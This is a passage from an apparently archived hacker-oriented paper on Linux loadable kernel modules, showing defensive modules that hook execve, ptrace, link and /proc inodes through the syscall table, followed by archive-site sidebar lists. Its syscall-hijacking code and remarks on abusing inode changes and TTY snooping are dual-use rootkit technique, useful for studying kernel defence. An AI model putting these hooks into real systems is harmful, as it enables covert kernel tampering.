                                                                                                                                                            biometric, smartcard systems can often be defeated because of a very insecure
                                                                                                                                                            software interface;. You could secure your whole system with a mechanism like
                                                                                                                                                            that. Control your whole kernel with a smartcard  :)<br>
                                                                                                                                                            Another not so 'extreme' way would be to implement your own systemcall which is
                                                                                                                                                            responsible for authentication. (see II.11 for an example of creating your
                                                                                                                                                            own systemcall).<br>
                                                                                                                                                            <li>find a better way to check in sys_create_module(...). Checking a variable is
                                                                                                                                                            not very secure, if someone rooted your system he could patch the memory (see
                                                                                                                                                            the next part)<br>
                                                                                                                                                            <li>find a way to make it impossible for an attacker to use your authentication
                                                                                                                                                            for insmod'ing his LKM <br>
                                                                                                                                                            <li>add hiding features<br>
                                                                                                                                                            <li>...<br>
                                                                                                                                                            </ul>

                                                                                                                                                            You can see, there is some work to do. But even with those steps, your system
                                                                                                                                                            cannot be totally secure.If someone rooted the system he could find other tricks
                                                                                                                                                            to load his LKM (see next part); perhaps he even does not need a LKM, because he
                                                                                                                                                            only rooted thesystem, and don't want to hide files / processeses (and the other
                                                                                                                                                            wonderfull things possible with LKMs).

                                                                                                                                                            <H3><A NAME="III.2."></A>2. Anti-LKM-Infector ideas</h3

                                                                                                                                                            In this section I will concentrate on the LKM Infector by SVAT, because I cannot
                                                                                                                                                            present a generic LKM infection scanner. Perhaps this would be possible with
                                                                                                                                                            something like heuristic tests or something similar. There are many ways you
                                                                                                                                                            can implement a LKM infector scanner. You can divide them into two big groups :
                                                                                                                                                            <ul>
                                                                                                                                                            <li> memory resident (realtime) scanner (like TSR virus scanner in DOS;or VxD
                                                                                                                                                            scanner virus in WIN9x)<br>
                                                                                                                                                            <li> file checking scanner (checking module files for signs of an infection)<br>
                                                                                                                                                            </ul>
                                                                                                                                                            The first method is possible through intercepting sys_create_module (or the
                                                                                                                                                            init_module call). The second approach needs something characteristic which you
                                                                                                                                                            may find in any infected file. We know that the LKM infector appends two module
                                                                                                                                                            files. So we could check for two ELF headers / signatures. Of course, any other
                                                                                                                                                            LKM infector could use a improved method (encryption, selfmodifying code etc.).
                                                                                                                                                            I won't present a file checking scanner, because you just have to write a little
                                                                                                                                                            (user space) programm that reads in the module, and checks for twe ELF headers
                                                                                                                                                            (the 'ELF' string, for example).

                                                                                                                                                            <H3><A NAME="III.3."></A>3. Make your programs untraceable (theory)</h3>

                                                                                                                                                            Now it's time to beat hackers snooping our executables. As I said before strace
                                                                                                                                                            is the tool of our choice. I presented it as a tool helping us to see which
                                                                                                                                                            systemcalls are used in certain programs. Another very interesting use of strace
                                                                                                                                                            is outlined in the paper 'Human to Unix Hacker' by TICK/THC. He shows us how to
                                                                                                                                                            use strace for TTY hijacking. Just strace your neighbours shell,and you will get
                                                                                                                                                            every input he makes. So you admins should realize the danger of strace. The
                                                                                                                                                            program strace uses the following API function :<br>

                                                                                                                                                            <xmp>
                                                                                                                                                            #include <sys/ptrace.h>

                                                                                                                                                            int ptrace(int request, int pid, int addr, int data);
                                                                                                                                                            </xmp>

                                                                                                                                                            Well how can we control strace? Don't be silly and remove strace from your
                                                                                                                                                            system, and think everything is ok - as I show you ptrace(...) is a library
                                                                                                                                                            function. Every hacker can code his own program doing the same as strace. So
                                                                                                                                                            we need a better more secure solution. Your first idea could be to search for
                                                                                                                                                            an interesting systemcall that could be responsible for the tracing; There is
                                                                                                                                                            a systemcall doing that; but let's look at another approach before.<br>
                                                                                                                                                            Remember II.5.1 : I talked about the task flags. There were two flags which
                                                                                                                                                            stand for traced processes. This is the way we can control the tracing on our
                                                                                                                                                            system. Just intercept the sys_execve(...) systemcall and check the current
                                                                                                                                                            process for one of the two flags set.<br>

                                                                                                                                                            <H4><A NAME="III.3.1."></A>3.1  Practical Example of a prototype Anti-Tracer</h4>

                                                                                                                                                            This is my little LKM called 'Anti-Tracer'. It basicly implements the ideas from
                                                                                                                                                            4. The flags field from our process can easily be retrieved using the current
                                                                                                                                                            pointer (task structure). The rest is nothing new.

                                                                                                                                                            <xmp>
                                                                                                                                                            #define MODULE
                                                                                                                                                            #define __KERNEL__

                                                                                                                                                            #include <linux/module.h>
                                                                                                                                                            #include <linux/kernel.h>
                                                                                                                                                            #include <asm/unistd.h>
                                                                                                                                                            #include <sys/syscall.h>
                                                                                                                                                            #include <sys/types.h>
                                                                                                                                                            #include <asm/fcntl.h>
                                                                                                                                                            #include <asm/errno.h>
                                                                                                                                                            #include <linux/types.h>
                                                                                                                                                            #include <linux/dirent.h>
                                                                                                                                                            #include <sys/mman.h>
                                                                                                                                                            #include <linux/string.h>
                                                                                                                                                            #include <linux/fs.h>
                                                                                                                                                            #include <linux/malloc.h>

                                                                                                                                                            extern void* sys_call_table[];

                                                                                                                                                            int __NR_myexecve;

                                                                                                                                                            int (*orig_execve) (const char *, const char *[], const char *[]);

                                                                                                                                                            char *strncpy_fromfs(char *dest, const char *src, int n)
                                                                                                                                                        {
                                                                                                                                                            char *tmp = src;
                                                                                                                                                            int compt = 0;

                                                                                                                                                            do {
                                                                                                                                                            dest[compt++] = __get_user(tmp++, 1);
                                                                                                                                                        }
                                                                                                                                                            while ((dest[compt - 1] != '\0') && (compt != n));
                                                                                                                                                            return dest;
                                                                                                                                                        }

                                                                                                                                                            int my_execve(const char *filename, const char *argv[], const char *envp[])
                                                                                                                                                        {
                                                                                                                                                            long __res;
                                                                                                                                                            __asm__ volatile ("int $0x80":"=a" (__res):"0"(__NR_myexecve), "b"((long)
                                                                                                                                                            (filename)), "c"((long) (argv)), "d"((long) (envp)));
                                                                                                                                                            return (int) __res;
                                                                                                                                                        }


                                                                                                                                                            int hacked_execve(const char *filename, const char *argv[], const char *envp[])
                                                                                                                                                        {
                                                                                                                                                            int ret, tmp;
                                                                                                                                                            unsigned long mmm;
                                                                                                                                                            char *kfilename;

                                                                                                                                                            /*check for the flags*/
                                                                                                                                                            if ((current->flags & PF_PTRACED)||(current->flags & PF_TRACESYS)) {
                                                                                                                                                            /*we are traced, so print the traced process (program name) and return
  without execution*/
                                                                                                                                                            kfilename = (char *) kmalloc(256, GFP_KERNEL);
                                                                                                                                                            (void) strncpy_fromfs(kfilename, filename, 255);
                                                                                                                                                            printk("<1>TRACE ATTEMPT ON %s -> PERMISSION DENIED\n", kfilename);
                                                                                                                                                            kfree(kfilename);
                                                                                                                                                            return 0;
                                                                                                                                                        }
                                                                                                                                                            ret = my_execve(filename, argv, envp);
                                                                                                                                                            return ret;
                                                                                                                                                        }

                                                                                                                                                            int init_module(void)                /*module setup*/
                                                                                                                                                        {
                                                                                                                                                            __NR_myexecve = 200;
                                                                                                                                                            while (__NR_myexecve != 0 && sys_call_table[__NR_myexecve] != 0)
                                                                                                                                                            __NR_myexecve--;
                                                                                                                                                            orig_execve = sys_call_table[SYS_execve];
                                                                                                                                                            if (__NR_myexecve != 0)
                                                                                                                                                        {
                                                                                                                                                            sys_call_table[__NR_myexecve] = orig_execve;
                                                                                                                                                            sys_call_table[SYS_execve] = (void *) hacked_execve;
                                                                                                                                                        }
                                                                                                                                                            return 0;
                                                                                                                                                        }

                                                                                                                                                            void cleanup_module(void)            /*module shutdown*/
                                                                                                                                                        {
                                                                                                                                                            sys_call_table[SYS_execve]=orig_execve;
                                                                                                                                                        }
                                                                                                                                                            <xmp>

                                                                                                                                                            This LKM also logs any executable someone wanted to execute with tracing. Well
                                                                                                                                                            this LKM checks for some flags, but what if you start tracing a program which
                                                                                                                                                            is already running. Just imagine a program (shell or whatever) running with the
                                                                                                                                                            PID 1853, now you do a 'strace -p 1853'. This will work. So for securing this
                                                                                                                                                            hooking sys_ptrace(...) is the only way. Look at the following module :

                                                                                                                                                            <xmp>
                                                                                                                                                            #define MODULE
                                                                                                                                                            #define __KERNEL__

                                                                                                                                                            #include <linux/module.h>
                                                                                                                                                            #include <linux/kernel.h>
                                                                                                                                                            #include <asm/unistd.h>
                                                                                                                                                            #include <sys/syscall.h>
                                                                                                                                                            #include <sys/types.h>
                                                                                                                                                            #include <asm/fcntl.h>
                                                                                                                                                            #include <asm/errno.h>
                                                                                                                                                            #include <linux/types.h>
                                                                                                                                                            #include <linux/dirent.h>
                                                                                                                                                            #include <sys/mman.h>
                                                                                                                                                            #include <linux/string.h>
                                                                                                                                                            #include <linux/fs.h>
                                                                                                                                                            #include <linux/malloc.h>

                                                                                                                                                            extern void* sys_call_table[];


                                                                                                                                                            int (*orig_ptrace)(long request, long pid, long addr, long data);

                                                                                                                                                            int hacked_ptrace(long request, long pid, long addr, long data)
                                                                                                                                                        {
                                                                                                                                                            printk("TRACING IS NOT ALLOWED\n");
                                                                                                                                                            return 0;
                                                                                                                                                        }


                                                                                                                                                            int init_module(void)                /*module setup*/
                                                                                                                                                        {
                                                                                                                                                            orig_ptrace=sys_call_table[SYS_ptrace];
                                                                                                                                                            sys_call_table[SYS_ptrace]=hacked_ptrace;
                                                                                                                                                            return 0;
                                                                                                                                                        }

                                                                                                                                                            void cleanup_module(void)            /*module shutdown*/
                                                                                                                                                        {
                                                                                                                                                            sys_call_table[SYS_ptrace]=orig_ptrace;
                                                                                                                                                        }
                                                                                                                                                            <xmp>

                                                                                                                                                            Use this LKM and no one will be able to trace anymore.


                                                                                                                                                            <H3><A NAME="III.4."></A>5. Hardening the Linux Kernel with LKMs</h3>

                                                                                                                                                            This section subject may sound familiar to Phrack readers. Route introduced nice
                                                                                                                                                            ideas for making the Linux system more secure. He used some patches. I want to
                                                                                                                                                            show that some ideas can also be implemented by LKMs. Remember that without
                                                                                                                                                            hiding those LKMs it is also <i>useful</i> (of course hiding is something you should
                                                                                                                                                            do), because route's patches are also worthless if someone rooted the system;
                                                                                                                                                            and a non-priviledged user can <i>not</i> remove our LKM, but he can see it.
                                                                                                                                                            The advantage of using LKMs instead of a static kernel patch : you can easily
                                                                                                                                                            manage the whole system security, and install it more easily on running system.
                                                                                                                                                            It's not necessary to install a new kernel on sensitive system you need every
                                                                                                                                                            second.<br>
                                                                                                                                                            The Phrack patches also added some logging feature's which I did not implement
                                                                                                                                                            but there are thousand ways to do it.The simpelst way would be using printk(...)
                                                                                                                                                            [Note : I did not look at every aspect of route's patches. Perhaps real good
                                                                                                                                                            kernel hackers would be able to do more with LKMs.]


                                                                                                                                                            <H4><A NAME="III.4.1."></A>4.1  Why should we allow arbitrary programs execution rights? </h4>

                                                                                                                                                            The following LKM is something like route's kernel patch that checks for
                                                                                                                                                            execution rights :

                                                                                                                                                            <xmp>
                                                                                                                                                            #define __KERNEL__
                                                                                                                                                            #define MODULE


                                                                                                                                                            #include <linux/version.h>
                                                                                                                                                            #include <linux/mm.h>
                                                                                                                                                            #include <linux/unistd.h>
                                                                                                                                                            #include <linux/fs.h>
                                                                                                                                                            #include <linux/types.h>
                                                                                                                                                            #include <asm/errno.h>
                                                                                                                                                            #include <asm/string.h>
                                                                                                                                                            #include <linux/fcntl.h>
                                                                                                                                                            #include <sys/syscall.h>
                                                                                                                                                            #include <linux/module.h>
                                                                                                                                                            #include <linux/malloc.h>
                                                                                                                                                            #include <linux/kernel.h>
                                                                                                                                                            #include <linux/kerneld.h>

                                                                                                                                                            /* where the sys_calls are */

                                                                                                                                                            int __NR_myexecve = 0;

                                                                                                                                                            extern void *sys_call_table[];

                                                                                                                                                            int (*orig_execve) (const char *, const char *[], const char *[]);

                                                                                                                                                            int (*open)(char *, int, int);
                                                                                                                                                            int (*close)(int);


                                                                                                                                                            char *strncpy_fromfs(char *dest, const char *src, int n)
                                                                                                                                                        {
                                                                                                                                                            char *tmp = src;
                                                                                                                                                            int compt = 0;

                                                                                                                                                            do {
                                                                                                                                                            dest[compt++] = __get_user(tmp++, 1);
                                                                                                                                                        }
                                                                                                                                                            while ((dest[compt - 1] != '\0') && (compt != n));
                                                                                                                                                            return dest;
                                                                                                                                                        }

                                                                                                                                                            int my_execve(const char *filename, const char *argv[], const char *envp[])
                                                                                                                                                        {
                                                                                                                                                            long __res;
                                                                                                                                                            __asm__ volatile ("int $0x80":"=a" (__res):"0"(__NR_myexecve), "b"((long)
                                                                                                                                                            (filename)), "c"((long) (argv)), "d"((long) (envp)));
                                                                                                                                                            return (int) __res;
                                                                                                                                                        }

                                                                                                                                                            int hacked_execve(const char *filename, const char *argv[], const char *envp[])
                                                                                                                                                        {
                                                                                                                                                            int fd = 0, ret;
                                                                                                                                                            struct file *file;

                                                                                                                                                            /*we need the inode strucure*/
                                                                                                                                                            /*I use the open approach here, because you should understand it from the LKM
 infector, read on for seeing a better approach*/
                                                                                                                                                            fd = open(filename, O_RDONLY, 0);

                                                                                                                                                            file = current->files->fd[fd];

                                                                                                                                                            /*is this a root file ?*/
                                                                                                                                                            /*Remember : you can do other checks here (route did more checks), but this
              is just for demonstration. Take a look at the inode structur to
              see other items to heck for (linux/fs.h)*/
                                                                                                                                                            if (file->f_inode->i_uid!=0)
                                                                                                                                                        {
                                                                                                                                                            printk("<1>Execution denied !\n");
                                                                                                                                                            close(fd);
                                                                                                                                                            return -1;
                                                                                                                                                        }
                                                                                                                                                            else /*otherwise let the user execute the file*/
                                                                                                                                                        {
                                                                                                                                                            ret = my_execve(filename, argv, envp);
                                                                                                                                                            return ret;
                                                                                                                                                        }
                                                                                                                                                        }

                                                                                                                                                            int init_module(void)                /*module setup*/
                                                                                                                                                        {
                                                                                                                                                            printk("<1>INIT \n");
                                                                                                                                                            __NR_myexecve = 250;
                                                                                                                                                            while (__NR_myexecve != 0 && sys_call_table[__NR_myexecve] != 0)
                                                                                                                                                            __NR_myexecve--;
                                                                                                                                                            orig_execve = sys_call_table[SYS_execve];
                                                                                                                                                            if (__NR_myexecve != 0)
                                                                                                                                                        {
                                                                                                                                                            printk("<1>everything OK\n");
                                                                                                                                                            sys_call_table[__NR_myexecve] = orig_execve;
                                                                                                                                                            sys_call_table[SYS_execve] = (void *) hacked_execve;
                                                                                                                                                        }

                                                                                                                                                            open = sys_call_table[__NR_open];
                                                                                                                                                            close = sys_call_table[__NR_close];
                                                                                                                                                            return 0;
                                                                                                                                                        }

                                                                                                                                                            void cleanup_module(void)            /*module shutdown*/
                                                                                                                                                        {
                                                                                                                                                            sys_call_table[SYS_execve]=orig_execve;
                                                                                                                                                        }
                                                                                                                                                            </xmp>

                                                                                                                                                            This is not exactly the same as route's kernel patch. route checked the <i>path</i>
                                                                                                                                                            we check the <i>file</i> (a path check would also be possible, but in my opinion a
                                                                                                                                                            file check is also the better way). I only implemented a check for UID of the
                                                                                                                                                            file, so an admin can filter the file execution process. As I said the open /
                                                                                                                                                            fd approach I used above is not the easiest way; I took it because it should be
                                                                                                                                                            familiar to you (remember, the LKM infector used this method). For our purpose
                                                                                                                                                            the following kernel function is also possible (easier way) :

                                                                                                                                                            <xmp>
                                                                                                                                                            int namei(const char *pathname, struct inode **res_inode);

                                                                                                                                                            int lnamei(const char *pathname, struct inode **res_inode);
                                                                                                                                                            </xmp>

                                                                                                                                                            Those functions take a certain pathname and return the corresponding inode
                                                                                                                                                            structure. The difference between the functions above lies in the symlink
                                                                                                                                                            resolving : lnamei does <i>not</i> resolve a symlink and returns the inode structure
                                                                                                                                                            for the symlink itself. As a hacker you could also modify inodes. Just retrieve
                                                                                                                                                            them by hooking sys_execve(...) and using namei(...) (the way we use also for
                                                                                                                                                            execution control) and manipulate the inode (I will show a practical example
                                                                                                                                                            of this idea in 5.3).

                                                                                                                                                            <H4><A NAME="III.4.2."></A>4.2 The Link Patch</h4>

                                                                                                                                                            Every Linux user knows that symlink bugs are something which often leads to
                                                                                                                                                            serious problems if it comes to system security. Andrew Tridgell developed a
                                                                                                                                                            kernel patch which prevents a process from 'following a link which is in a +t
                                                                                                                                                            (mostly /tmp/) directory unless they own the link'. Solar Designer added some
                                                                                                                                                            code which also prevents users from creating hard links in a +t directory to
                                                                                                                                                            files they don't own.<br>
                                                                                                                                                            I have to admit that the symlink patch lies on a layer we can't easily reach
                                                                                                                                                            from our LKM psotion. There are neither exported symbols we could patch nor any
                                                                                                                                                            systemcalls  we could intercept. The symlink resolving is done by the VFS. Take
                                                                                                                                                            a look at part IV for methods which could help us to solve this problem (but I
                                                                                                                                                            would not use the methods from IV to <i>secure</i> a system). You may wonder why I
                                                                                                                                                            don't use the sys_readlink(...) systemcall for solving the problem. Well this
                                                                                                                                                            call is used if you do a 'ls -a symlink' but it is not called if you issue a
                                                                                                                                                            'cat symlink'.<br>
                                                                                                                                                            In my opinion you should leave this as a kernel patch. Of course you can code
                                                                                                                                                            a LKM which intercepts the sys_symlink(...) systemcall in order to prevent a
                                                                                                                                                            user from creating symlinks in the /tmp directory. Look at the hard link LKM
                                                                                                                                                            for a similar implementation.<br>
                                                                                                                                                            Ok, the symlink problem was a bit hard to transform it to a LKM. How about Solar
                                                                                                                                                            Designer's idea concerning hard link restrictions. This can be done as LKM. We
                                                                                                                                                            only need to intercept sys_link(...) which is responsible for creating any hard
                                                                                                                                                            links.Let's take a look at hacked systemcall (the code fragment does not exactly
                                                                                                                                                            the same as the kernel patch, because we only check for the '/tmp/' directory,
                                                                                                                                                            not for the sticky bit(+t),but this can also be done with looking at the inode
                                                                                                                                                            structure of the directoy [see 5.1]) :

                                                                                                                                                            <xmp>
                                                                                                                                                            int hacked_link(const char *oldname, const char *newname)
                                                                                                                                                        {
                                                                                                                                                            char *kernel_newname;
                                                                                                                                                            int fd = 0, ret;
                                                                                                                                                            struct file *file;

                                                                                                                                                            kernel_newname = (char*) kmalloc(256, GFP_KERNEL);
                                                                                                                                                            memcpy_fromfs(kernel_newname, newname, 255);

                                                                                                                                                            /*hard link to /tmp/ directory ?*/
                                                                                                                                                            if (strstr(kernel_newname, (char*)&hide ) != NULL)
                                                                                                                                                        {
                                                                                                                                                            kfree(kernel_newname);

                                                                                                                                                            /*I use the open approach again :)*/
                                                                                                                                                            fd = open(oldname, O_RDONLY, 0);

                                                                                                                                                            file = current->files->fd[fd];

                                                                                                                                                            /*check for UID*/
                                                                                                                                                            if (file->f_inode->i_uid!=current->uid)
                                                                                                                                                        {
                                                                                                                                                            printk("<1>Hard Link Creation denied !\n");
                                                                                                                                                            close(fd);
                                                                                                                                                            return -1;
                                                                                                                                                        }
                                                                                                                                                        }
                                                                                                                                                            else
                                                                                                                                                        {
                                                                                                                                                            kfree(kernel_newname);
                                                                                                                                                            /*everything ok -> the user is allowed to create the hard link*/
                                                                                                                                                            return orig_link(oldname, newname);
                                                                                                                                                        }
                                                                                                                                                        }
                                                                                                                                                            </xmp>
                                                                                                                                                            This way you could also control the symlink <i>creation</i>.

                                                                                                                                                            <H4><A NAME="III.4.3."></A>4.3 The /proc permission patch</h4>

                                                                                                                                                            I already showed you some ways how to hide some process information.route's idea
                                                                                                                                                            is different to our hide approach. He wants to limit the /proc/ access (needed
                                                                                                                                                            for access to process information) by changing the directory permissions. So
                                                                                                                                                            he patched the proc inode. The following LKM will do exactly the same without a
                                                                                                                                                            static kernel patch. If you load it a user will not be allowed to read the proc
                                                                                                                                                            fs, if you unload it he will be able to. Here we go :

                                                                                                                                                            <xmp>
                                                                                                                                                            /*very bad programming style (perhaps we should use a function for the
                                                                                                                                                            indode retrieving), but it works...*/
                                                                                                                                                            #define __KERNEL__
                                                                                                                                                            #define MODULE
                                                                                                                                                            #define BEGIN_KMEM {unsigned long old_fs=get_fs();set_fs(get_ds());
                                                                                                                                                            #define END_KMEM   set_fs(old_fs);}

                                                                                                                                                            #include <linux/version.h>
                                                                                                                                                            #include <linux/mm.h>
                                                                                                                                                            #include <linux/unistd.h>
                                                                                                                                                            #include <linux/fs.h>
                                                                                                                                                            #include <linux/types.h>
                                                                                                                                                            #include <asm/errno.h>
                                                                                                                                                            #include <asm/string.h>
                                                                                                                                                            #include <linux/fcntl.h>
                                                                                                                                                            #include <sys/syscall.h>
                                                                                                                                                            #include <linux/module.h>
                                                                                                                                                            #include <linux/malloc.h>
                                                                                                                                                            #include <linux/kernel.h>
                                                                                                                                                            #include <linux/kerneld.h>

                                                                                                                                                            extern void *sys_call_table[];

                                                                                                                                                            int (*open)(char *, int, int);
                                                                                                                                                            int (*close)(int);


                                                                                                                                                            int init_module(void)                /*module setup*/
                                                                                                                                                        {
                                                                                                                                                            int fd = 0;
                                                                                                                                                            struct file *file;
                                                                                                                                                            struct inode *ino;

                                                                                                                                                            /*again the open(...) way*/
                                                                                                                                                            open = sys_call_table[SYS_open];
                                                                                                                                                            close = sys_call_table[SYS_close];

                                                                                                                                                            /*we have to supplie some kernel space data for the systemcall*/
                                                                                                                                                            BEGIN_KMEM
                                                                                                                                                            fd = open("/proc", O_RDONLY, 0);
                                                                                                                                                            END_KMEM
                                                                                                                                                            printk("%d\n", fd);
                                                                                                                                                            file = current->files->fd[fd];

                                                                                                                                                            /*here's the inode for the proc directory*/
                                                                                                                                                            ino= file->f_inode;

                                                                                                                                                            /*modify permissions*/
                                                                                                                                                            ino->i_mode=S_IFDIR | S_IRUSR | S_IXUSR;

                                                                                                                                                            close(fd);
                                                                                                                                                            return 0;
                                                                                                                                                        }

                                                                                                                                                            void cleanup_module(void)            /*module shutdown*/
                                                                                                                                                        {
                                                                                                                                                            int fd = 0;
                                                                                                                                                            struct file *file;
                                                                                                                                                            struct inode *ino;

                                                                                                                                                            BEGIN_KMEM
                                                                                                                                                            fd = open("/proc", O_RDONLY, 0);
                                                                                                                                                            END_KMEM
                                                                                                                                                            printk("%d\n", fd);
                                                                                                                                                            file = current->files->fd[fd];

                                                                                                                                                            /*here's the inode for the proc directory*/
                                                                                                                                                            ino= file->f_inode;

                                                                                                                                                            /*modify permissions*/
                                                                                                                                                            ino->i_mode=S_IFDIR | S_IRUGO | S_IXUGO;

                                                                                                                                                            close(fd);
                                                                                                                                                        }
                                                                                                                                                            </xmp>

                                                                                                                                                            Just load this module and try a ps, top or whatever, it won't work. Every access
                                                                                                                                                            to the /proc directory is totally denied. Of course, as root you are still
                                                                                                                                                            allowed to view every process and anything else; this is just a permission patch
                                                                                                                                                            in order to keep your users silly.<br>
                                                                                                                                                            [Note : This is a practical implementation of modifying inodes 'on the fly' you
                                                                                                                                                            should see many possibilities how to abuse this.]

                                                                                                                                                            <H4><A NAME="III.4.4."></A>4.4 The securelevel patch</h4>


                                                                                                                                                            The purpose of this patch : I quote route
                                                                                                                                                            <blockquote>
                                                                                                                                                            "This patch isn't really much of a patch.  It simply bumps the securelevel
                                                                                                                                                            up, to 1 from 0.  This freezes the immutable and append-only bits on files,
                                                                                                                                                            keeping anyone from changing them (from the normal chattr interface).  Before
                                                                                                                                                            turning this on, you should of course make certain key files immutable, and
                                                                                                                                                            logfiles append-only.  It is still possible to open the raw disk device,
                                                                                                                                                            however.  Your average cut and paste hacker will probably not know how to do
                                                                                                                                                            this."
                                                                                                                                                            </blockquote>
                                                                                                                                                            Ok this one is really easy to implement as a LKM. We are lucky because the symbol
                                                                                                                                                            responsible for the securelevel is public (see /proc/ksyms) so we can easily
                                                                                                                                                            change it. I won't present an example for this bit of code, just import secure
                                                                                                                                                            level and set it in the module's init function.

                                                                                                                                                            <H4><A NAME="III.4.5."></A>4.5 The rawdisk patch</h4>

                                                                                                                                                            I developed an easy way to avoid tools like THC's manipate-data.<br>
                                                                                                                                                            Those tools are used by hackers to search the hard disk for their origin IP address or DNS name.
                                                                                                                                                            After finding it they modify or remove the entry from the hard disk. For doing
                                                                                                                                                            all this they need access to the /dev/* files for opening the rawdisk. Of course
                                                                                                                                                            they can only do this after rooting the system. So what can we do about this. I
                                                                                                                                                            found that the following way helps to prevent those attacks [of course there are
                                                                                                                                                            again thousand ways to defeat that protection :(] :
                                                                                                                                                            <ul>
                                                                                                                                                            <li> boot your system<br>
                                                                                                                                                            <li> install a LKM which prevents direct (dev/*) access to your partition you save
                                                                                                                                                            your logs<br>
                                                                                                                                                            </ul>

                                                                                                                                                            This works because the system (normally) only needs direct access to the rawdisk
                                                                                                                                                            during the some (seldom) operationes. The LKM just intercepts sys_open(...) and
                                                                                                                                                            filter for the needed dev-file. I think it's not necessary to show how to code
                                                                                                                                                            it, take a look at II.4.2). This way you can protect any /dev/* file. The
                                                                                                                                                            problem is that this way nobody can access them directly while the LKM is
                                                                                                                                                            loaded. <br>
                                                                                                                                                            [Note : There are some functions which will not work / crash the system, but
                                                                                                                                                            a normal web-, or mailserver should work with this patch.]



                                                                                                                                                            <u><b>
                                                                                                                                                            <H2>IV. Some Better Ideas (for hackers)</H2>
                                                                                                                                                            </u></b>
                                                                                                                                                            <P><P>



                                                                                                                                                            <H3><A NAME="IV.1."></A>1. Tricks to beat admin LKMs</h3>

                                                                                                                                                            This part will give us some notes on playing with the kernel on systems where
                                                                                                                                                            you have a paranoid (good) admin. After explaining all the ways admins can
                                                                                                                                                            protect a system, it is very hard to find better ways for us (hackers). <br>
                                                                                                                                                            We need to leave the LKM field for some seconds in order to beat those hard
                                                                                                                                                            protections.<br>
                                                                                                                                                            Imagine a system where an admin has installed a very good and big monitor LKM
                                                                                                                                                            which checks every action on that system. It can do everything mentioned in part
                                                                                                                                                            II and III.<br>

                                                                                                                                                            Login or Register to add favorites

                                                                                                                                                            Follow on Twitter Follow us on Twitter
                                                                                                                                                            Follow on Facebook Follow us on Facebook
                                                                                                                                                            View RSS Feeds Subscribe to an RSS Feed

                                                                                                                                                            File Archive:
                                                                                                                                                            November 2021

                                                                                                                                                            Su
                                                                                                                                                            Mo
                                                                                                                                                            Tu
                                                                                                                                                            We
                                                                                                                                                            Th
                                                                                                                                                            Fr
                                                                                                                                                            Sa

                                                                                                                                                            1
                                                                                                                                                            2
                                                                                                                                                            3
                                                                                                                                                            4
                                                                                                                                                            5
                                                                                                                                                            6

                                                                                                                                                            7
                                                                                                                                                            8
                                                                                                                                                            9
                                                                                                                                                            10
                                                                                                                                                            11
                                                                                                                                                            12
                                                                                                                                                            13

                                                                                                                                                            14
                                                                                                                                                            15
                                                                                                                                                            16
                                                                                                                                                            17
                                                                                                                                                            18
                                                                                                                                                            19
                                                                                                                                                            20

                                                                                                                                                            21
                                                                                                                                                            22
                                                                                                                                                            23
                                                                                                                                                            24
                                                                                                                                                            25
                                                                                                                                                            26
                                                                                                                                                            27

                                                                                                                                                            28
                                                                                                                                                            29
                                                                                                                                                            30

                                                                                                                                                            Top Authors In Last 30 Days

                                                                                                                                                            Red Hat 113 files
                                                                                                                                                            Ubuntu 36 files
                                                                                                                                                            malvuln 30 files
                                                                                                                                                            Vulnerability Laboratory 21 files
                                                                                                                                                            Apple 12 files
                                                                                                                                                            Altion Malka 6 files
                                                                                                                                                            Alberto Favero 6 files
                                                                                                                                                            Google Security Research 6 files
                                                                                                                                                            Yvan Genuer 5 files
                                                                                                                                                            Sandro Gauci 5 files

                                                                                                                                                            File Tags

                                                                                                                                                            ActiveX (930)
                                                                                                                                                            Advisory (76,119)
                                                                                                                                                            Arbitrary (14,869)
                                                                                                                                                            BBS (2,859)
                                                                                                                                                            Bypass (1,491)
                                                                                                                                                            CGI (1,008)
                                                                                                                                                            Code Execution (6,345)
                                                                                                                                                            Conference (662)
                                                                                                                                                            Cracker (795)
                                                                                                                                                            CSRF (3,231)
                                                                                                                                                            DoS (21,404)
                                                                                                                                                            Encryption (2,314)
                                                                                                                                                            Exploit (48,770)
                                                                                                                                                            File Inclusion (4,108)
                                                                                                                                                            File Upload (929)
                                                                                                                                                            Firewall (821)
                                                                                                                                                            Info Disclosure (2,523)
                                                                                                                                                            Intrusion Detection (840)
                                                                                                                                                            Java (2,695)
                                                                                                                                                            JavaScript (783)
                                                                                                                                                            Kernel (5,831)
                                                                                                                                                            Local (13,839)
                                                                                                                                                            Magazine (586)
                                                                                                                                                            Overflow (11,927)
                                                                                                                                                            Perl (1,408)
                                                                                                                                                            PHP (5,015)
                                                                                                                                                            Proof of Concept (2,268)
                                                                                                                                                            Protocol (3,196)
                                                                                                                                                            Python (1,345)
                                                                                                                                                            Remote (29,173)
                                                                                                                                                            Root (3,412)
                                                                                                                                                            Ruby (563)
                                                                                                                                                            Scanner (1,624)
                                                                                                                                                            Security Tool (7,596)
                                                                                                                                                            Shell (2,994)
                                                                                                                                                            Shellcode (1,192)
                                                                                                                                                            Sniffer (874)
                                                                                                                                                            Spoof (2,031)
                                                                                                                                                            SQL Injection (15,807)
                                                                                                                                                            TCP (2,344)
                                                                                                                                                            Trojan (662)
                                                                                                                                                            UDP (864)
                                                                                                                                                            Virus (656)
                                                                                                                                                            Vulnerability (29,965)
                                                                                                                                                            Web (8,779)
                                                                                                                                                            Whitepaper (3,674)
                                                                                                                                                            x86 (939)
                                                                                                                                                            XSS (17,139)
                                                                                                                                                            Other

                                                                                                                                                            File Archives

                                                                                                                                                            November 2021
                                                                                                                                                            October 2021
                                                                                                                                                            September 2021
                                                                                                                                                            August 2021
                                                                                                                                                            July 2021
                                                                                                                                                            June 2021
                                                                                                                                                            May 2021
                                                                                                                                                            April 2021
                                                                                                                                                            March 2021
                                                                                                                                                            February 2021
                                                                                                                                                            January 2021
                                                                                                                                                            December 2020
                                                                                                                                                            Older

                                                                                                                                                            Systems

                                                                                                                                                            AIX (423)
                                                                                                                                                            Apple (1,843)
                                                                                                                                                            BSD (368)
                                                                                                                                                            CentOS (54)
                                                                                                                                                            Cisco (1,908)
                                                                                                                                                            Debian (5,946)
                                                                                                                                                            Fedora (1,690)
                                                                                                                                                            FreeBSD (1,241)
                                                                                                                                                            Gentoo (4,148)
                                                                                                                                                            HPUX (875)
                                                                                                                                                            iOS (306)
                                                                                                                                                            iPhone (108)
                                                                                                                                                            IRIX (220)
                                                                                                                                                            Juniper (67)
                                                                                                                                                            Linux (40,858)
                                                                                                                                                            Mac OS X (681)
                                                                                                                                                            Mandriva (3,105)
                                                                                                                                                            NetBSD (255)
                                                                                                                                                            OpenBSD (476)
                                                                                                                                                            RedHat (10,593)
                                                                                                                                                            Slackware (941)
